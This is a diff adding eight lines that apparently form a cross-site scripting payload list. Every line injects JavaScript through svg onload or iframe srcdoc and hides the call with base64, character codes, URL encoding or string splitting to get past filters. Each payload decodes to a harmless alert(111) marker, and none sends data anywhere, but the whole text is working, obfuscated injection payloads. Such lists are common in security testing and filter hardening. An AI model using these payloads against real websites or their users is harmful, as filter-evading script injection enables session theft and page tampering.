@@ -1,0 +1,8 @@
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>">
+<iframe srcdoc="<script>setTimeout(Function('al'+'ert(111)'),1000)</script>">
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,49,49,41))>
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>
+<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>
